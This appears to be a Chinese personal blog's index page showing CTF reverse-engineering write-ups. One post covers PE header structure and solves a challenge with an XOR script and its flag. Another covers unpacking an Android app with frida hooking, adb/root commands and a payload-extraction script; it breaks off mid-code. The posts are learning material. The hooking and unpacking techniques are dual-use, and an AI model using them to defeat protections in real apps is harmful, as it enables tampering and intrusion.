<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="linkpwn的学习经历">
<meta property="og:type" content="website">
<meta property="og:title" content="网络幻影">
<meta property="og:url" content="http://linkpwn.github.io/index.html">
<meta property="og:site_name" content="网络幻影">
<meta property="og:description" content="linkpwn的学习经历">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="linkpwn">
<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://linkpwn.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>网络幻影</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">网络幻影</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
      <a>
        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            

	<div class="tag-cloud">
	  <div class="tag-cloud-tags" id="tags">
		
	  </div>
	</div>
	<br>
	
	<script type="text/javascript">
     var alltags = document.getElementsByClassName('tag-cloud-tags');
     var tags = alltags[0].getElementsByTagName('a');
     for (var i = tags.length - 1; i >= 0; i--) {
       var r=Math.floor(Math.random()*75+130);
       var g=Math.floor(Math.random()*75+100);
       var b=Math.floor(Math.random()*75+80);
       tags[i].style.background = "rgb("+r+","+g+","+b+")";
     }
</script>

<style>
  .tag-cloud-tags{
    /*font-family: Helvetica, Tahoma, Arial;*/
    /*font-weight: 100;*/
    text-align: center;
    counter-reset: tags;
  }
  .tag-cloud-tags a{
    border-radius: 6px;
    padding-right: 5px;
    padding-left: 5px;
    margin: 8px 5px 0px 0px;
  }
  .tag-cloud-tags a:before{
    content: "?";
  }

  .tag-cloud-tags a:hover{
     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);
     transform: scale(1.1);
     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/
     transition-duration: 0.15s;
  }
</style>

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/15/PE%E7%BB%93%E6%9E%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/15/PE%E7%BB%93%E6%9E%84/" class="post-title-link" itemprop="url">PE结构</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-15 09:00:18" itemprop="dateCreated datePublished" datetime="2025-09-15T09:00:18+08:00">2025-09-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:45:14" itemprop="dateModified" datetime="2025-09-23T20:45:14+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><p>先贴一张结构图</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/1.png" alt="1"></p>
<h2 id="PE-文件执行时-PE-装载器的操作流程"><a href="#PE-文件执行时-PE-装载器的操作流程" class="headerlink" title="PE 文件执行时 PE 装载器的操作流程"></a>PE 文件执行时 PE 装载器的操作流程</h2><ol>
<li>检查 DOS 头中 PE 头偏移，跳转至 PE 头位置.[E 文件被执行后，PE 装载器首先启动定位操作 —— 读取 DOS 头（DOS header）中记录的 PE 头（PE header）偏移量，确认该偏移位置后，直接跳转到 PE 头所在的内存地址，为后续验证 PE 头做准备。]</li>
<li>验证 PE 头有效性，跳转至 PE 头尾部[跳转至 PE 头后，PE 装载器进入验证环节：检查当前 PE 头的格式与标识是否符合规范（即判断 PE 头是否有效）。若验证通过，装载器会进一步跳转到 PE 头的尾部 —— 因 PE 头尾部与节表（Section Table）直接衔接，此跳转可快速衔接后续节表处理流程。]</li>
<li>读取节表信息，通过文件映射机制映射节段并设属性[PE 头尾部紧跟节表，装载器在完成 PE 头验证后，立即读取节表中的节段信息（如节段大小、位置等）；随后采用文件映射机制处理节段：Windows 不会一开始就将整个 PE 文件读入物理内存，仅由装载器建立虚拟地址与 PE 文件的映射关系，仅当需要执行某内存页指令或访问某页数据时，才将对应页面从磁盘提交到物理内存（该机制确保文件装入速度不受文件大小显著影响）；同时，装载器会根据节表中指定的规则，为映射到内存的节段设置对应的读写属性（如只读、可写、可执行等）。]</li>
<li>处理 PE 文件中的逻辑部分[待所有节段成功映射入内存后，PE 装载器进入后续逻辑处理阶段：针对 PE 文件中需动态关联的逻辑部分（典型如输入表 import table，用于关联外部函数与资源），继续执行解析、关联等操作，确保 PE 文件能正常调用外部资源，为最终执行指令奠定基础。]</li>
</ol>
<h2 id="分析一个程序"><a href="#分析一个程序" class="headerlink" title="分析一个程序"></a>分析一个程序</h2><p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/2.png" alt="1"></p>
<p>DOS头分成header和DOS存根。</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/4.png" alt="1"></p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/3.png" alt="1"></p>
<p>如图2，e_lfanew指向PE头的位置。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/6.png" alt="1"></p>
<p>有两处被改动了</p>
<p>WZ –&gt;  MZ   90 –&gt;80再用IDA打开。</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/5.png" alt="1"></p>
<p>发现可以正常打开了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已知的 data 数组（37字节）</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设输入长度为 n，因为 data 有 n 字节，且最后是 &#125;</span></span><br><span class="line"><span class="comment"># 使用递推：input[i+1] = input[i] ^ i ^ data[i]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">start_char</span>):</span><br><span class="line">    inp = [<span class="number">0</span>] * n</span><br><span class="line">    inp[<span class="number">0</span>] = start_char</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        inp[i+<span class="number">1</span>] = inp[i] ^ i ^ data[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inp).decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试常见 flag 开头</span></span><br><span class="line">candidates = [<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;F&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> candidates:</span><br><span class="line">    flag = recover_flag(<span class="built_in">ord</span>(c))</span><br><span class="line">    <span class="keyword">if</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;可能的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 额外检查是否合理</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&#x27;FLAG&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&#x27;ctf&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 匹配格式: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" class="post-title-link" itemprop="url">apk逆向部分总结持续更新</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-12 21:00:59" itemprop="dateCreated datePublished" datetime="2025-09-12T21:00:59+08:00">2025-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:20:06" itemprop="dateModified" datetime="2025-09-23T20:20:06+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/apk%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">apk逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="apk逆向部分总结持续更新"><a href="#apk逆向部分总结持续更新" class="headerlink" title="apk逆向部分总结持续更新"></a>apk逆向部分总结持续更新</h1><h2 id="strangeapp-apk-frida的使用"><a href="#strangeapp-apk-frida的使用" class="headerlink" title="strangeapp.apk(frida的使用)"></a>strangeapp.apk(frida的使用)</h2><p>先用jadx打开</p>
<p>一般主要逻辑就在源代码的com的MainActivity里面。</p>
<p>本题：</p>
<p>shell:</p>
<p>JniBridge主要用于 Java 与原生代码（如 C&#x2F;C++）之间的交互。</p>
<p>MainActivity在布局中的<code>sampleText</code>控件上显示文本 “hello”。</p>
<p>主要实现了应用启动时的初始化、环境检测、动态加载 Dex 文件等功能，是一个应用壳程序（Shell）。</p>
<p>strangeapp:</p>
<p>MainActivity用户在输入框中输入一段文本，点击按钮后，程序将其处理成字节数组（aa()），然后与 TARGET 比较（compareBytes），如果一致就弹出成功提示。</p>
<p>MainActivity$$ExternalSyntheticLambda0用来实现一个按钮的点击事件。</p>
<p>总的来说</p>
<p>它主要是一个”壳”（Shell），负责解密和加载真正的应用逻辑隐藏在assets的extract.dat。</p>
<p>壳的主要逻辑在native层，native层在apk(apk是zip文件可以解压)的lib里的so文件里。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" alt="1"></p>
<p>so文件可以用IDA打开</p>
<p>分析so文件知道JNI_OnLoad&#96;函数处理APK中的隐藏数据（偏移298440处），映射为ELF文件并执行。flag可能由这个ELF文件生成或解密得出。</p>
<p>此时我们可以用frida进行hook。</p>
<p>先写一下frida的安装，我这里用的是夜神模拟器。</p>
<p>先用pip安转frida和frida-tools，我这里用的是conda安转的直接pip install xxx就行了。</p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda activate xxxx </span><br><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version #查看版本</span><br></pre></td></tr></table></figure>

<p>我这里是16.5.9，然后去<a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">官网</a>下载</p>
<p>然后到   夜神模拟器\Nox\bin  打开终端 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nox_adb.exe devices</span><br><span class="line">adb -s &lt;ip:port&gt; shell</span><br><span class="line">getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" alt="1"></p>
<p>64位 所以我们下载frida-server-16.5.9-android-x86_64.xz</p>
<p>解压</p>
<p>再到 夜神模拟器\Nox\bin  打开终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-16.5.9-android-x86_64 /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp/</span><br><span class="line">chmod 755 frida-server-16.5.9-android-x86_64</span><br><span class="line">./frida-server-16.5.9-android-x86_64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U #查看所有进程</span><br><span class="line">frida-ps -Ua #查看所有安装的应用</span><br><span class="line">frida -U -l hook.js -n &quot;com.example.myapp&quot;  #运行js脚本</span><br></pre></td></tr></table></figure>

<p>有时候会遇见闪退，就点击的时候立即运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pidof com.swdd.strangeapp  #获取PID</span><br></pre></td></tr></table></figure>

<p>然后再用获取的PID运行hook.js注意此时不能点击模拟器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -p PID -l hook.js</span><br></pre></td></tr></table></figure>

<p>用frida直接hook密文，秘钥，和iv直接猜测AES解密，这个感觉不是正解，正解应该是要脱壳。</p>
<p>先分析JNI_OnLoad的sub_1FDE8，可以知道高度混淆的原生库加载器。</p>
<p>用脚本提取出elf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Payload的起始偏移量</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">0x48DC8</span>  <span class="comment"># 十进制 298440</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_payload</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从输入的SO文件中提取Payload并保存到输出文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 检查输入文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(input_file):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误: 输入文件 &#x27;<span class="subst">&#123;input_file&#125;</span>&#x27; 不存在。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">            <span class="comment"># 跳转到Payload的起始偏移量</span></span><br><span class="line">            f_in.seek(PAYLOAD_OFFSET)</span><br><span class="line">            <span class="comment"># 读取从偏移量开始到文件末尾的所有数据</span></span><br><span class="line">            payload_data = f_in.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否读取到了数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> payload_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误: 在偏移量 <span class="subst">&#123;PAYLOAD_OFFSET&#125;</span> 之后没有数据。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据写入输出文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">            f_out.write(payload_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功! Payload 已从 &#x27;<span class="subst">&#123;input_file&#125;</span>&#x27; 提取到 &#x27;<span class="subst">&#123;output_file&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取大小: <span class="subst">&#123;<span class="built_in">len</span>(payload_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 如果没有提供参数，使用默认路径</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        input_file = <span class="string">r&quot;D:\桌面\libshell.so&quot;</span></span><br><span class="line">        output_file = <span class="string">r&quot;D:\桌面\payload.elf&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;使用默认路径: 输入文件=<span class="subst">&#123;input_file&#125;</span>, 输出文件=<span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 使用提供的参数</span></span><br><span class="line">        input_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">        output_file = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    extract_payload(input_file, output_file)</span><br></pre></td></tr></table></figure>

<p>把dat文件(在解压后的assets文件夹里)用010打开，分析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 